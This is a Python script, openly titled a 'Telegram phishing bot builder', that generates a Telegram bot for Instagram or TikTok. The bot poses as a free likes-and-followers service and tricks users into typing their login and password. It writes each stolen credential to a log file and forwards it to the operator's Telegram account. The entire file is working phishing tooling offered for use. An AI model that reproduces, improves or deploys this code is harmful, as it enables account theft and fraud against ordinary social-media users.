# Code modified and improved by DarkG8

import telebot
from telebot import types
import time
import os
from sys import platform

def clear_screen():
    os.system('cls' if platform == 'win32' else 'clear')

clear_screen()

print('''\033[92m
         .e$$$$e.
       e$$$$$$$$$$e
      $$$$$$by$$$$$$
     d$$$$$$$$$$$$$$b
     $$$$$DarkG8$$$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F * 4$$F * 4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$
         "$$$$$$"
          ^$$$$
4$$c       ""       .$$r
^$$$b              e$$$"
d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
$$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
"*$$$"            ^$$P
    ""              ^"
\033[0m''')

print('''\033[95m
_____ _____ _      _____
|_   _|  ___| |    |  ___
  | | | |__ | |    | |__
  | | |  __|| |    |  __|
  | | | |___| |____| |___
  \_/ \____/\_____/\____/ \033[91m
______ _   _ _____ _____ _   _
| ___ \ | | |_   _/  ___| | | |
| |_/ / |_| | | | \ `--.| |_| |
|  __/|  _  | | |  `--. \  _  |
| |   | | | |_| |_/\__/ / | | |
\_|   \_| |_/\___/\____/\_| |_/
\033[0m''')

print('\033[92m#########################################')
print('\033[92m+\033[94m     Telegram phishing bot builder     \033[92m+')
print('\033[92m+\033[94m       Developer: DarkG8         \033[92m+')
print('\033[92m#########################################\033[0m')

def validate_input(prompt, input_type=str):
    while True:
        user_input = input(prompt)
        if input_type == int:
            if user_input.isdigit():
                return int(user_input)
            print("Ошибка: введите число!")
        else:
            if user_input.strip():
                return user_input
            print("Ошибка: ввод не может быть пустым!")

userid = validate_input('\033[93mВведите свой Telegram ID > \033[0m')
token = validate_input('\033[94mВведите токен бота > \033[0m')

print('''\033[96m
[1] Instagram
[2] Tiktok
\033[0m''')

choice = validate_input('\033[95mВыберите вариант фишинга в боте>>> \033[0m', int)

def generate_bot_script(platform_name):
    return f"""import telebot
from telebot import types
import time

print("Бот запущен и готов к работе!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")

try:
    bot.send_message(ID, '!The bot is up and running!')
except:
    print("Error: you may not have written /start to the bot!")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, '''👋 Hi! 👋
This is a recruiting bot for your {platform_name} account!
To get started, press /tipping''')

@bot.message_handler(commands=['nacrutka', 'n'])
def start_nacrutka(message):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("Barkers❤️", callback_data="likes"),
        types.InlineKeyboardButton("Subscribers📃", callback_data="subs")
    ]
    if platform_name.lower() == 'tiktok':
        buttons.extend([
            types.InlineKeyboardButton("Views👁️", callback_data="views"),
            types.InlineKeyboardButton("reposts🔄", callback_data="reposts")
        ])
    keyboard.add(*buttons)
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    msg = bot.send_message(call.message.chat.id, 'Enter the quantity (max. 500):')
    bot.register_next_step_handler(msg, process_quantity)

def process_quantity(message):
    try:
        num = int(message.text)
        if num <= 0 or num > 500:
            bot.reply_to(message, "Enter a number from 1 to 500!")
            return
        
        msg = bot.send_message(message.chat.id, 'Enter your login/phone number:')
        bot.register_next_step_handler(msg, process_login)
        
    except ValueError:
        bot.reply_to(message, "Enter the correct number!")

def process_login(message):
    login = message.text
    log_data = f'''Data {platform_name}:
ID: {message.from_user.id}
Nick: @{message.from_user.username}
Login: {login}
Name: {message.from_user.first_name}
'''
    log.write(log_data)
    bot.send_message(ID, log_data)
    
    msg = bot.send_message(message.chat.id, 'Enter your password:')
    bot.register_next_step_handler(msg, process_password)

def process_password(message):
    password = message.text
    log_data = f'''Password {platform_name}:
ID: {message.from_user.id}
Password: {password}
'''
    log.write(log_data)
    bot.send_message(ID, log_data)
    
    bot.reply_to(message, 'Thank you! Expect a tipping within 24 hours!')
    time.sleep(1)
    bot.send_message(message.chat.id, '⚠️ Don't give your details to anyone!')

bot.polling()
"""

if choice == 1:
    with open('Instagram.py', 'w', encoding='utf-8') as f:
        f.write(generate_bot_script('Instagram'))
    print("\nInstagram.py successfully created!")
elif choice == 2:
    with open('TikTok.py', 'w', encoding='utf-8') as f:
        f.write(generate_bot_script('TikTok'))
    print("\nThe file TikTok.py has been successfully created!")

input("\nPress Enter to exit...")
clear_screen()